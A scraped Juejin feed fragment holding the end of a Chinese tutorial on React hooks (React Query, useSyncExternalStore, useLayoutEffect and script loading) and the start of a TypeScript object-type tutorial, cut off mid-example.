  <span class="hljs-attr">queryFn</span>: fetchUsers,
});

<span class="hljs-keyword">const</span> userId = users?.[<span class="hljs-number">0</span>]?.<span class="hljs-property">id</span>;

<span class="hljs-keyword">const</span> { <span class="hljs-attr">data</span>: orders } = <span class="hljs-title function_">useQuery</span>({
  <span class="hljs-attr">queryKey</span>: [<span class="hljs-string">'orders'</span>, userId],
  <span class="hljs-attr">queryFn</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">fetchOrders</span>(userId!),
  <span class="hljs-attr">enabled</span>: !!userId, <span class="hljs-comment">// 依赖就绪才触发</span>
});
</code></pre>
<p>要点：</p>
<ul>
<li><strong>queryKey 必须包含依赖参数</strong>（如 <code>userId</code>），否则缓存命中与更新会错乱</li>
<li><strong>enabled 负责“何时允许请求”</strong>，避免依赖未就绪时请求报错或无意义请求</li>
</ul>
<h4 data-id="heading-12">分页 vs 无限滚动（为什么需要 useInfiniteQuery）</h4>
<ul>
<li><strong>分页</strong>：按页码分块拉取（如 <code>page=1&amp;limit=20</code>），适合明确翻页的列表</li>
<li><strong>无限滚动</strong>：滚动到临界点加载下一页，更贴近信息流体验</li>
</ul>
<p>在手写方案里，你要维护 page、合并列表、处理 loading/error、判断是否还有下一页；而 React Query 的 <code>useInfiniteQuery</code> 会把这些常用模式封装好（页缓存、<code>hasNextPage</code>、合并等）。</p>
<hr/>
<h3 data-id="heading-13">性能与体验优化 Hooks</h3>
<h4 data-id="heading-14">useMemo：缓存“计算结果”</h4>
<p>适用于 <strong>昂贵计算</strong> 或需要 <strong>稳定引用</strong> 的派生值，避免每次渲染都重复计算、或导致子组件误触发更新。</p>
<p>要点：</p>
<ul>
<li><code>useMemo</code> 不是“免费”的；依赖很少变化、计算很重时收益更大</li>
<li>不要把它当“到处都要加”的默认优化</li>
</ul>
<hr/>
<h4 data-id="heading-15">useCallback：缓存“函数引用”</h4>
<p>用于将事件处理函数/回调稳定化，尤其是：</p>
<ul>
<li>作为 props 传给 <code>memo</code> 子组件</li>
<li>作为依赖传给其它 hooks（如 <code>useEffect</code>）</li>
</ul>
<hr/>
<h4 data-id="heading-16">useTransition：标记低优先级更新（可被打断）</h4>
<p>用于把非紧急的更新放入 transition，让输入、点击等高优先级交互更流畅：</p>
<ul>
<li>典型场景：输入框过滤大列表、切换复杂视图等</li>
<li><code>isPending</code> 可用于展示加载态/骨架屏等</li>
</ul>
<hr/>
<h4 data-id="heading-17">useDeferredValue：为某个值提供“延迟版本”</h4>
<p>适合 <strong>由 props/state 变化引起的慢渲染</strong>，但更新发起点不在当前组件、或不方便用 <code>startTransition</code> 包裹的情况，一般用于父组件传递props值变化引起子组件重渲染的情况。</p>
<p>对比：</p>
<ul>
<li><strong><code>useTransition</code></strong>：关注“这次更新操作”应低优先级、可中断</li>
<li><strong><code>useDeferredValue</code></strong>：关注“使用这个值的渲染”可以晚一点发生</li>
</ul>
<hr/>
<h4 data-id="heading-18">useSyncExternalStore：订阅外部 Store（并发渲染一致性 + 可控性能）</h4>
<p><code>useSyncExternalStore</code> 面向“外部状态源”（Redux、Zustand、自建 store、EventEmitter 等）。它的核心价值不是语法糖，而是让 React 在 <strong>并发渲染（Concurrent Rendering）</strong> 下读取外部状态时保持一致性（避免 tearing），并把订阅/快照的时机与 React 渲染流程对齐。</p>
<h5 data-id="heading-19">为什么不用 <code>useEffect + subscribe + setState</code>？</h5>
<p><code>useEffect</code> 的订阅发生在 commit 之后：组件首屏 render/commit 时可能还没订阅成功；如果外部 store 在这段窗口内变化，组件会短暂展示旧值，甚至在并发渲染下出现“同一帧内不同组件读到不同版本”的撕裂（tearing）。</p>
<p><code>useSyncExternalStore</code> 的模型是：</p>
<ul>
<li><strong>render 阶段读取 snapshot</strong>：通过 <code>getSnapshot()</code> 获取当前 store 的一致性快照</li>
<li><strong>React 负责订阅时机</strong>：通过 <code>subscribe()</code> 在合适时机建立订阅，并在 store 变更时触发重新读取 snapshot</li>
<li><strong>以 snapshot 作为真相来源</strong>：组件渲染只依赖 snapshot，而不是“effect 里手动 setState”</li>
</ul>
<h5 data-id="heading-20">API 形状与关键约束</h5>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> state = <span class="hljs-title function_">useSyncExternalStore</span>(subscribe, getSnapshot, getServerSnapshot?);
</code></pre>
<ul>
<li><strong>subscribe</strong>：<code>(onStoreChange) =&gt; unsubscribe</code>，store 变化时调用 <code>onStoreChange</code></li>
<li><strong>getSnapshot</strong>：返回当前快照值；<strong>必须在“未变化”时返回同一个引用</strong>（或至少让 <code>Object.is</code> 判定相等），否则会造成无意义重渲染</li>
<li><strong>getServerSnapshot</strong>（SSR 可选）：服务端渲染时使用的快照读取方式，保证 hydration 一致</li>
</ul>
<h5 data-id="heading-21">与 Redux / Zustand 的关系（你可能“间接”在用）</h5>
<ul>
<li><strong>React-Redux v8</strong> 内部用 <code>useSyncExternalStore</code> 实现订阅一致性，所以 <code>useSelector</code> 在并发渲染下更安全。</li>
<li>Zustand 等库也会用同类机制（或提供 selector 版本）来避免“读到不一致状态”。</li>
</ul>
<p>实践建议：</p>
<ul>
<li><strong>能用成熟库就别手写</strong>：外部 store 的边界条件很多（并发一致性、选择器、性能、订阅风暴）。</li>
<li><strong>需要 selector 时</strong>：优先使用库自带 selector，或使用官方 shim 的 selector 版本思路（避免每次 snapshot 都导致大对象变化）。</li>
</ul>
<hr/>
<h4 data-id="heading-22">useOptimistic（React 19+）：乐观更新</h4>
<p>在异步操作真正完成前，先在 UI 上展示“假定成功”的状态；当操作失败时，React 会丢弃对应 transition 的更新，使回滚更简单，这个天然需要配合useTransition使用，因为useTransition当获取数据失败之后可以自动回滚，取消渲染，不需要手动callback更新旧值。</p>
<p>适用场景：</p>
<ul>
<li>成功率高、回滚代价小（例如点赞、收藏、轻量新增）</li>
</ul>
<hr/>
<h3 data-id="heading-23">浏览器渲染过程与 useLayoutEffect / useEffect</h3>
<p>理解一个关键时序有助于正确选择副作用 hooks：</p>
<ul>
<li><strong>render</strong>：计算 Virtual DOM（Fiber）</li>
<li><strong>commit</strong>：把变更应用到真实 DOM</li>
<li><strong>paint</strong>：浏览器把像素绘制到屏幕</li>
</ul>
<h4 data-id="heading-24">useLayoutEffect：在 paint 之前执行（会阻塞绘制）</h4>
<p>特点：</p>
<ul>
<li>DOM 已更新但屏幕尚未绘制</li>
<li>适合：必须读取布局（测量尺寸/位置）并立刻同步写回，避免闪动（layout shift）</li>
<li>风险：逻辑重会阻塞 paint，造成卡顿</li>
</ul>
<h4 data-id="heading-25">useEffect：在 paint 之后执行（通常不阻塞首屏）</h4>
<p>特点：</p>
<ul>
<li>更适合非布局相关副作用（请求、订阅、日志、非关键 DOM 操作）</li>
</ul>
<h4 data-id="heading-26">为什么动画常推荐 transform / opacity</h4>
<p>浏览器渲染大致包含：</p>
<ul>
<li>解析 HTML 构建 DOM Tree</li>
<li>解析 CSS 构建 CSSOM</li>
<li>合并生成 Render Tree</li>
<li>layout（回流：计算几何信息）</li>
<li>paint（绘制）</li>
<li>composite（合成层，通常更快）</li>
</ul>
<p><code>transform</code> / <code>opacity</code> / <code>will-change</code> 更容易走合成路径，减少 layout/paint 压力，动画更顺滑。</p>
<p>示例（提示浏览器提前优化某些属性的变化）：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.box</span> {
  <span class="hljs-attribute">will-change</span>: transform;
}

<span class="hljs-selector-class">.box</span><span class="hljs-selector-pseudo">:hover</span> {
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">100px</span>);
  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span>;
}
</code></pre>
<hr/>
<h4 data-id="heading-27">
</h4><p>浏览器解析 HTML 时遇到脚本，会影响“解析、下载、执行”的时机：</p>
<ul>
<li><strong>普通脚本</strong>：<code>&lt;script src="app.js"&gt;&lt;/script&gt;</code>
<ul>
<li>解析 HTML 会被暂停，等待下载并执行脚本后再继续解析</li>
</ul>
</li>
<li><strong>defer</strong>：<code>&lt;script src="app.js" defer&gt;&lt;/script&gt;</code>
<ul>
<li>解析 HTML 与下载脚本并行</li>
<li>等 DOM 构建完成后按顺序执行（更适合依赖 DOM 的业务脚本）</li>
</ul>
</li>
<li><strong>async</strong>：<code>&lt;script src="analytics.js" async&gt;&lt;/script&gt;</code>
<ul>
<li>解析 HTML 与下载脚本并行</li>
<li>脚本下载完成立刻执行（执行时会中断 HTML 解析），执行顺序不可控</li>
<li>适合不依赖 DOM/不依赖其它脚本的场景（如埋点）</li>
</ul>
</li>
<li><strong>module</strong>：<code>&lt;script type="module" src="main.js"&gt;&lt;/script&gt;</code>
<ul>
<li>类似 defer 的加载时机，但 <strong>支持 ESM 依赖解析（import/export）</strong></li>
<li>会根据依赖图决定执行顺序（不是简单按标签出现顺序）</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-28">特殊场景 Hooks（1–2 句话概括）</h3>
<h4 data-id="heading-29">useId：生成稳定且避免冲突的 id</h4>
<p>用于表单控件 <code>label</code>/<code>input</code> 关联等；SSR 场景下可以保证服务端与客户端生成一致。</p>
<h4 data-id="heading-30">useInsertionEffect：更早插入样式（CSS-in-JS 场景）</h4>
<p>在 DOM 插入前运行，常用于运行时注入样式，时机早于 <code>useLayoutEffect</code>；一般业务组件很少直接使用。</p>
<h4 data-id="heading-31">useDebugValue：为自定义 Hook 提供 DevTools 展示信息</h4>
<p>只影响开发者工具显示，不影响渲染逻辑，适合提升自定义 hooks 的可调试性。</p>
<h4 data-id="heading-32">useActionState（React 19+）：面向 action 的状态管理</h4>
<p>更适合与 action/表单提交一类交互配合，帮助在事件/动作驱动下获得更一致的状态流（常见于新形态表单与异步提交流程）。</p>
<h4 data-id="heading-33">useEffectEvent（React 新增能力）：避免闭包陈旧值的事件回调</h4>
<p>用于创建“不会因为渲染而重建、但能读取最新 state”的事件回调，减少把事件处理函数塞进依赖数组引发的复杂性。</p>
<hr/>
<h3 data-id="heading-34">Redux 常用 Hooks（React-Redux）</h3>
<h4 data-id="heading-35">useSelector：从 store 读取并订阅片段状态</h4>
<p>用于选择需要的 state 片段；建议搭配 selector 与 memo 化策略，避免不必要的重渲染。</p>
<h4 data-id="heading-36">useDispatch：派发 action</h4>
<p>获取 <code>dispatch</code> 用于触发更新；在大型应用中常配合 thunk/saga 或 RTK Query 管理异步与数据请求。</p>
<h4 data-id="heading-37">useStore：获取 store 实例（少用）</h4>
<p>一般业务很少需要直接操作 store 实例；更多用于框架层集成或极少数高级场景。</p>
<hr/>
<h3 data-id="heading-38">React Navigation 常用 Hooks（移动端导航）</h3>
<blockquote>
<p>不同版本 API 略有差异，以下为最常见的概念性用法。</p>
</blockquote>
<h4 data-id="heading-39">useNavigation：获取 navigation 对象</h4>
<p>用于跳转、返回、设置标题等（如 <code>navigate/goBack/setOptions</code>），是函数组件里最常见的导航入口。</p>
<h4 data-id="heading-40">useRoute：获取当前路由信息</h4>
<p>用于读取路由参数与当前页面的 route 元数据（如 <code>params</code>）。</p>
<h4 data-id="heading-41">useFocusEffect：页面聚焦时执行副作用</h4>
<p>用于“进入页面/返回页面时刷新数据或注册监听”的场景，语义上比 <code>useEffect</code> 更贴合导航生命周期。</p>
<h4 data-id="heading-42">useIsFocused：判断页面是否聚焦</h4>
<p>适合控制“仅在当前页面可见时运行”的逻辑，例如暂停轮询、暂停动画/视频等。</p>
<hr/>
<h3 data-id="heading-43">常见误区与最佳实践速记</h3>
<ul>
<li><strong>依赖数组不是可选项</strong>：缺依赖往往不是“优化”，而是潜在 bug（陈旧值、错过更新）。</li>
<li><strong>不要过度 memo</strong>：<code>useMemo/useCallback</code> 适用于瓶颈点；到处包裹会增加心智负担与维护成本。</li>
<li><strong>副作用分层</strong>：数据请求与缓存优先交给专用库（SWR/React Query），组件只负责展示与交互。</li>
<li><strong>选对 effect 时机</strong>：布局测量/避免闪动用 <code>useLayoutEffect</code>，其他尽量用 <code>useEffect</code>。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScript 全面详解：对象类型的语法规则与实战指南]]></title>    <link>https://juejin.cn/post/7594276252460417034</link>    <guid>https://juejin.cn/post/7594276252460417034</guid>    <pubDate>2026-01-12T14:26:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594276252460417034" data-draft-id="7594309641866641446" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScript 全面详解：对象类型的语法规则与实战指南"/> <meta itemprop="keywords" content="TypeScript"/> <meta itemprop="datePublished" content="2026-01-12T14:26:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="如果你好"/> <meta itemprop="url" content="https://juejin.cn/user/2272012281328215"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScript 全面详解：对象类型的语法规则与实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2272012281328215/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    如果你好
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T14:26:04.000Z" title="Mon Jan 12 2026 14:26:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TypeScript 全面详解：对象类型的语法规则与实战指南</h2>
<blockquote>
<p>🔥全面解析 TypeScript 对象类型的语法细节和使用规范。</p>
</blockquote>
<h3 data-id="heading-1">一、对象类型的基础声明</h3>
<h4 data-id="heading-2">1. 直接字面量声明</h4>
<p>对象类型最简单的声明方式，就是使用<strong>大括号 <code>{}</code></strong> 包裹，内部逐一声明每个属性的名称和对应类型，这是最直观的对象类型定义方式。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 变量后直接声明对象类型</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">obj</span>: {
  <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>;
} = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">1</span> };
</code></pre>
<p>上述示例中，变量 <code>obj</code> 的类型直接写在变量名后，大括号内明确约束了 <code>x</code> 和 <code>y</code> 两个属性均为 <code>number</code> 类型，赋值时必须严格匹配该类型结构。</p>
<h4 data-id="heading-3">2. 属性分隔符规则</h4>
<p>对象类型内部的属性之间，支持<strong>分号 <code>;</code></strong> 或<strong>逗号 <code>,</code></strong> 作为分隔符，两种写法效果完全一致，可根据个人或团队编码风格选择。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 写法 1：分号分隔（推荐，更清晰区分属性与类型结束）</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">MyObj1</span> = {
  <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>;
};

<span class="hljs-comment">// 写法 2：逗号分隔（贴近 JavaScript 对象字面量写法）</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">MyObj2</span> = {
  <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>,
  <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>,
};
</code></pre>
<p>另外，最后一个属性后面的分隔符是可选的，可写可不写，不会影响类型校验。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 合法：最后一个属性后无分隔符</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">MyObj3</span> = {
  <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>
};
</code></pre>
<h4 data-id="heading-4">3. 严格的属性匹配规则</h4>
<p>一旦声明了对象类型，赋值时就必须严格遵守「<strong>不多不少</strong>」的原则：不能缺少声明过的属性，也不能额外添加未声明的属性。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MyObj</span> = {
  <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>;
};

<span class="hljs-comment">// 错误：缺少属性 y（Property 'y' is missing in type '{ x: number; }'）</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">o1</span>: <span class="hljs-title class_">MyObj</span> = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span> };

<span class="hljs-comment">// 错误：多余属性 z（Object literal may only specify known properties）</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">o2</span>: <span class="hljs-title class_">MyObj</span> = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">z</span>: <span class="hljs-number">1</span> };
</code></pre>
<p>这种严格校验仅针对「对象字面量直接赋值」，如果是将对象赋值给一个变量后再传递，多余属性不会报错（这是 TS 的「对象字面量新鲜度」规则），但仍不推荐这样做。</p>
<h4 data-id="heading-5">4. 属性的读写与删除规则</h4>
<ul>
<li>读写未声明的属性：会直接报错，TS 不允许访问对象类型中不存在的属性。</li>
<li>删除已声明的属性：会报错，TS 不允许删除类型声明中明确存在的属性。</li>
<li>修改已声明属性的值：合法，只要值的类型与声明类型一致即可。</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-attr">obj</span>: {
  <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>;
} = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">1</span> };

<span class="hljs-comment">// 错误：读取不存在的属性 z（Property 'z' does not exist on type '{ x: number; y: number; }'）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">z</span>);

<span class="hljs-comment">// 错误：写入不存在的属性 z（Property 'z' does not exist on type '{ x: number; y: number; }'）</span>
obj.<span class="hljs-property">z</span> = <span class="hljs-number">1</span>;

<span class="hljs-keyword">const</span> <span class="hljs-attr">myUser</span>: { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> } = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"Sabrina"</span>,
};

<span class="hljs-comment">// 错误：删除已声明的属性 name（The operand of a 'delete' operator must be optional）</span>
<span class="hljs-keyword">delete</span> myUser.<span class="hljs-property">name</span>;

<span class="hljs-comment">// 正确：修改属性值（类型匹配）</span>
myUser.<span class="hljs-property">name</span> = <span class="hljs-string">"Cynthia"</span>;
</code></pre>
<h3 data-id="heading-6">二、对象方法的类型声明</h3>
<p>对象中的方法可以通过两种方式声明类型：<strong>函数签名语法</strong> 和 <strong>箭头函数语法</strong>，两种写法效果一致，推荐使用函数签名语法（更贴近 JavaScript 方法的书写习惯）。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-attr">obj</span>: {
  <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// 写法 1：函数签名语法（推荐）</span>
  <span class="hljs-title function_">add</span>(<span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// 写法 2：箭头函数语法</span>
  <span class="hljs-attr">subtract</span>: <span class="hljs-function">(<span class="hljs-params">x: <span class="hljs-built_in">number</span>, y: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span>;
} = {
  <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">y</span>: <span class="hljs-number">1</span>,
  <span class="hljs-title function_">add</span>(<span class="hljs-params">x, y</span>) {
    <span class="hljs-keyword">return</span> x + y;
  },
  <span class="hljs-title function_">subtract</span>(<span class="hljs-params">x, y</span>) {
    <span class="hljs-keyword">return</span> x - y;
  }
};
</code></pre>
<p>上述示例中，方法 <code>add</code> 和 <code>subtract</code> 均声明了参数类型（两个 <code>number</code> 类型）和返回值类型（<code>number</code> 类型），实现时必须严格遵循该类型约束。</p>
<h3 data-id="heading-7">三、对象属性类型的读取</h3>
<p>TypeScript 支持使用<strong>方括号 <code>[]</code></strong> 读取对象类型中某个属性的具体类型，这在提取单个属性类型、实现类型复用场景中非常有用。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 定义完整对象类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">gender</span>: <span class="hljs-built_in">boolean</span>;
};

<span class="hljs-comment">// 读取 name 属性的类型 → string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UserName</span> = <span class="hljs-title class_">User</span>[<span class="hljs-string">'name'</span>];

<span class="hljs-comment">// 读取 age 属性的类型 → number</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UserAge</span> = <span class="hljs-title class_">User</span>[<span class="hljs-string">'age'</span>];

<span class="hljs-comment">// 实际使用：约束变量类型为 User 的 name 属性类型</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">userName</span>: <span class="hljs-title class_">UserName</span> = <span class="hljs-string">"张三"</span>;
<span class="hljs-keyword">const</span> <span class="hljs-attr">userAge</span>: <span class="hljs-title class_">UserAge</span> = <span class="hljs-number">22</span>;
</code></pre>
<p>注意，方括号内的属性名必须用引号包裹（字符串字面量），且必须是对象类型中已声明的属性，否则会报错。</p>
<h3 data-id="heading-8">四、对象类型的两种别名方式：type vs interface</h3>
<p>除了直接字面量声明，TypeScript 还提供了两种方式将对象类型提炼为可复用的别名：<code>type</code> 命令和 <code>interface</code> 命令，两者在对象类型声明场景中功能相似。</p>
<h4 data-id="heading-9">1. 两种方式的基本使用</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 写法 1：type 命令（类型别名）</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">MyObjType</span> = {
  <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>;
};

<span class="hljs-keyword">const</span> <span class="hljs-attr">obj1</span>: <span class="hljs-title class_">MyObjType</span> = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">1</span> };

<span class="hljs-comment">// 写法 2：interface 命令（接口）</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyObjInterface</span> {
  <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-attr">obj2</span>: <span class="hljs-title class_">MyObjInterface</span> = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">1</span> };
</code></pre>
<h4 data-id="heading-10">2. 接口的特殊特性：继承属性的兼容</h4>
<p>TypeScript 不区分对象「自身属性」和「继承属性」，一律视为对象的合法属性。因此，在接口中声明的继承属性（如 <code>toString()</code>），实现时无需手动提供（可从原型链继承）。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyInterface</span> {
